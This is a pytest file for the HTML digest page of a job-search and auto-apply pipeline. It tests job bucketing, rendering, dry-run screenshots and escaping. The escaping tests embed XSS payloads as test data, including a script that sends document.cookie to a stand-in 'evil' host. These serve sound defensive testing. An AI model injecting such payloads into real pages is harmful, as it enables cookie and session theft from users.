"""Tests for src/digest.py — the file the user actually opens.

Everything else in this pipeline is plumbing feeding this page, so two
properties dominate:

  * **Escaping.** Job titles, companies and descriptions are attacker-
    controllable text from the open internet, rendered into HTML that opens
    from `file://` — the most privileged origin on the machine. Autoescape is
    not a nicety here.
  * **Legibility of failure.** A run that fetched nothing because every board
    404'd produces a page that looks a lot like a quiet Tuesday. The funnel
    and the error list are what make those two distinguishable, so they must
    render even when there are no jobs at all.
"""

from __future__ import annotations

import re
from datetime import timedelta
from pathlib import Path

import pytest

from src.digest import (
    build_context,
    relative_time,
    render_html,
    write_digest,
)
from src.models import ApplyStatus, RunStats
from tests.conftest import NOW, make_job, make_scored, write_config

XSS = '<img src=x onerror=alert(1)>Engineer'


def digest_config(tmp_path: Path, **overrides):
    base = {"output": {"dir": str(tmp_path / "output"), "open_browser": False}}
    base.update(overrides or {})
    return write_config(tmp_path, base)


def sample_jobs(tmp_path: Path):
    """One job in each outcome bucket."""
    needs_click = make_scored(score=91, company="Northwind", ats_job_id="1")

    applied = make_scored(score=95, company="Globex", ats_job_id="2")
    applied.status = ApplyStatus.APPLIED
    applied.status_detail = "submitted via greenhouse"

    dry = make_scored(score=88, company="Initech", ats_job_id="3")
    dry.status = ApplyStatus.DRY_RUN
    dry.status_detail = "dry run — filled name, email, phone, not submitted"
    shot = tmp_path / "output" / "applications" / "initech" / "form_filled.png"
    shot.parent.mkdir(parents=True, exist_ok=True)
    shot.write_bytes(b"\x89PNG\r\n\x1a\nfake")
    dry.artifacts.screenshot = str(shot)

    failed = make_scored(score=84, company="Umbrella", ats_job_id="4")
    failed.status = ApplyStatus.APPLY_FAILED
    failed.status_detail = "dropdown 'Country' — this bot never picks an option for you"

    below = make_scored(score=41, company="Soylent", ats_job_id="5")
    below.status = ApplyStatus.SCORED_BELOW
    below.status_detail = "score 41 is below threshold 65"

    return [needs_click, applied, dry, failed, below]


def stats():
    s = RunStats(fetched=312, after_dedupe=287, after_filters=41,
                 already_seen=29, scored=12, matches=5, tailored=5,
                 auto_applied=1, dry_run=1, apply_failed=1, digest_items=1)
    s.source_counts.update({"greenhouse": 200, "lever": 112})
    s.errors.append("greenhouse/dead: HTTP 404 (slug not found)")
    return s


# ==========================================================================
# relative_time
# ==========================================================================


@pytest.mark.parametrize(
    "delta,expected_fragment",
    [
        (timedelta(seconds=30), "just now"),
        (timedelta(minutes=45), "45m"),
        (timedelta(hours=3), "3h"),
        (timedelta(hours=30), "yesterday"),
        (timedelta(days=4), "4d"),
    ],
)
def test_relative_time(delta, expected_fragment):
    assert expected_fragment in relative_time(NOW - delta, NOW)


def test_relative_time_on_an_undated_posting():
    assert relative_time(None, NOW) == "—"


# ==========================================================================
# build_context — bucketing
# ==========================================================================


def test_every_job_lands_in_the_right_bucket(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Northwind"]
    assert [i["company"] for i in ctx["auto_applied"]] == ["Globex"]
    assert [i["company"] for i in ctx["dry_run"]] == ["Initech"]
    assert [i["company"] for i in ctx["failed"]] == ["Umbrella"]
    assert [i["company"] for i in ctx["below"]] == ["Soylent"]


def test_needs_click_is_sorted_by_score_descending(tmp_path: Path):
    jobs = [make_scored(score=s, ats_job_id=str(s)) for s in (70, 95, 82)]
    ctx = build_context(jobs, stats(), digest_config(tmp_path), now=NOW)
    assert [i["score"] for i in ctx["needs_click"]] == [95, 82, 70]


def test_bucketing_is_stable_for_equal_scores(tmp_path: Path):
    """A digest that reshuffles between runs over the same data is a digest
    you stop trusting."""
    jobs = [make_scored(score=80, company=f"C{i}", ats_job_id=str(i)) for i in range(5)]
    cfg = digest_config(tmp_path)
    first = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    second = build_context(jobs, stats(), cfg, now=NOW)["needs_click"]
    assert [i["company"] for i in first] == [i["company"] for i in second]


def test_items_are_plain_dicts_not_scored_jobs(tmp_path: Path):
    """The template must not be able to reach back into pipeline objects."""
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    for item in ctx["needs_click"]:
        assert isinstance(item, dict)


def test_an_item_carries_everything_the_page_shows(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    item = ctx["needs_click"][0]
    for key in ("key", "company", "title", "location", "url", "source", "score",
                "verdict", "reasons", "gaps", "status", "status_detail"):
        assert key in item, key


def test_context_carries_the_funnel_and_the_errors(tmp_path: Path):
    ctx = build_context(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    labels = {step["label"]: step["value"] for step in ctx["funnel"]}
    assert labels["fetched"] == 312
    assert labels["matched"] == 5
    assert ctx["source_counts"]["greenhouse"] == 200
    assert any("404" in e for e in ctx["errors"])


def test_build_context_is_pure(tmp_path: Path):
    """No I/O and no ambient clock — the same inputs give the same page."""
    jobs = sample_jobs(tmp_path)
    cfg = digest_config(tmp_path)
    assert build_context(jobs, stats(), cfg, now=NOW) == build_context(
        jobs, stats(), cfg, now=NOW)


def test_build_context_skips_an_unrenderable_record_without_blanking_the_page(
        tmp_path: Path):
    broken = make_scored(score=90, ats_job_id="9")
    broken.job = None                       # type: ignore[assignment]
    good = make_scored(score=80, company="Fine", ats_job_id="8")
    ctx = build_context([broken, good], stats(), digest_config(tmp_path), now=NOW)
    assert [i["company"] for i in ctx["needs_click"]] == ["Fine"]


def test_build_context_with_no_jobs_at_all(tmp_path: Path):
    ctx = build_context([], RunStats(), digest_config(tmp_path), now=NOW)
    assert ctx["totals"]["all"] == 0
    assert ctx["funnel"]


# ==========================================================================
# render_html — escaping
# ==========================================================================


def test_a_hostile_job_title_is_escaped(tmp_path: Path):
    """Job text comes from the open internet and the page opens from file://,
    the most privileged origin on the machine."""
    job = make_scored(score=90, title=XSS, company='"><script>alert(1)</script>')
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<img src=x onerror" not in html
    assert "<script>alert(1)</script>" not in html
    assert "&lt;img" in html or "&lt;script" in html


def test_a_hostile_description_is_escaped(tmp_path: Path):
    job = make_scored(score=90,
                      description="<script>fetch('http://evil/'+document.cookie)</script>")
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<script>fetch(" not in html


def test_hostile_model_output_is_escaped(tmp_path: Path):
    """The model's own reasons are text it was fed — a prompt-injected posting
    can put markup there too."""
    job = make_scored(score=90, reasons=["<iframe src=evil></iframe>"])
    html = render_html(build_context([job], stats(), digest_config(tmp_path), now=NOW))
    assert "<iframe" not in html


def test_a_hostile_error_string_is_escaped(tmp_path: Path):
    s = stats()
    s.errors.append("<script>alert('errors')</script>")
    html = render_html(build_context([], s, digest_config(tmp_path), now=NOW))
    assert "<script>alert('errors')</script>" not in html


# ==========================================================================
# render_html — content
# ==========================================================================


def test_the_page_renders_every_section(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    lowered = html.lower()
    for heading in ("needs your click", "auto-applied", "dry run", "below threshold"):
        assert heading in lowered, heading


def test_the_page_is_self_contained(tmp_path: Path):
    """It opens from file:// — a CDN reference is a blank page on a train."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "<style" in html
    for remote in ("https://cdn", "http://cdn", "cdnjs", "googleapis",
                   "unpkg.com", "jsdelivr"):
        assert remote not in html, remote
    # No remote <link>/<script> src of any kind.
    assert not re.search(r'<(?:script|link)[^>]+(?:src|href)=["\']https?://', html)


def test_application_links_open_safely(tmp_path: Path):
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert 'target="_blank"' in html
    assert "noopener" in html


def test_the_funnel_is_rendered_so_a_broken_run_is_visible(tmp_path: Path):
    html = render_html(build_context([], stats(), digest_config(tmp_path), now=NOW))
    assert "312" in html          # fetched
    assert "404" in html          # the error that explains a quiet day


def test_a_completely_empty_run_still_renders_a_usable_page(tmp_path: Path):
    html = render_html(build_context([], RunStats(), digest_config(tmp_path), now=NOW))
    assert len(html) > 500
    assert "<html" in html.lower() or "<!doctype" in html.lower() or "<body" in html.lower()
    assert "nothing new" in html.lower() or "0" in html


def test_the_dry_run_screenshot_is_linked_and_inlined(tmp_path: Path):
    """Checking screenshots is the entire point of dry-run week; making the
    user hunt for the file defeats it."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "form_filled.png" in html
    assert "<img" in html


def test_the_bail_reason_is_shown_verbatim(tmp_path: Path):
    """This is how the user learns what the safety rules are catching."""
    html = render_html(build_context(sample_jobs(tmp_path), stats(),
                                     digest_config(tmp_path), now=NOW))
    assert "never picks an option" in html


def test_the_dry_run_state_is_stated_on_the_page(tmp_path: Path):
    cfg = digest_config(tmp_path, apply={"dry_run": True, "enabled": True})
    html = render_html(build_context(sample_jobs(tmp_path), stats(), cfg, now=NOW))
    assert "dry" in html.lower()


def test_a_failed_score_is_shown_as_unscored_not_as_zero(tmp_path: Path):
    """Rendering "0" would read as "terrible fit" rather than "we could not
    judge this one" — which are opposite instructions to the reader."""
    job = make_scored(score=0, error="API timeout")
    job.status_detail = "scorer failed (API timeout) — shown unscored, judge it yourself"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)

    item = ctx["needs_click"][0]
    assert item["score_label"] == "?"          # not "0"
    assert item["score_error"] == "API timeout"
    assert "API timeout" in render_html(ctx)


def test_a_scorer_error_is_not_printed_twice(tmp_path: Path):
    """`status_detail` quotes the same error the card already shows; printing
    both makes a one-line problem look like two."""
    job = make_scored(score=0, error="API timeout")
    job.status_detail = "scorer failed (API timeout) — shown unscored"
    ctx = build_context([job], stats(), digest_config(tmp_path), now=NOW)
    assert render_html(ctx).count("API timeout") == 1


# ==========================================================================
# write_digest
# ==========================================================================


def test_write_digest_writes_a_dated_file(tmp_path: Path):
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    assert path.name == "digest_2026-08-04.html"
    assert path.exists()
    assert path.read_text(encoding="utf-8").strip()


def test_write_digest_also_writes_a_stable_latest_copy(tmp_path: Path):
    """So a cron user can bookmark exactly one URL."""
    path = write_digest(sample_jobs(tmp_path), stats(), digest_config(tmp_path), now=NOW)
    latest = path.parent / "digest_latest.html"
    assert latest.exists()
    assert latest.read_text(encoding="utf-8") == path.read_text(encoding="utf-8")


def test_write_digest_creates_the_output_directory(tmp_path: Path):
    cfg = digest_config(tmp_path, output={"dir": str(tmp_path / "deep" / "nested")})
    assert write_digest([], RunStats(), cfg, now=NOW).exists()


def test_rerunning_overwrites_todays_digest(tmp_path: Path):
    cfg = digest_config(tmp_path)
    first = write_digest([], RunStats(), cfg, now=NOW)
    second = write_digest(sample_jobs(tmp_path), stats(), cfg, now=NOW)
    assert first == second
    assert "Northwind" in second.read_text(encoding="utf-8")


def test_write_digest_is_utf8(tmp_path: Path):
    job = make_scored(score=90, company="Zürich Insurance",
                      title="Ingénieur Backend (m/w/d)")
    path = write_digest([job], stats(), digest_config(tmp_path), now=NOW)
    text = path.read_text(encoding="utf-8")
    assert "Zürich" in text
    assert "Ingénieur" in text
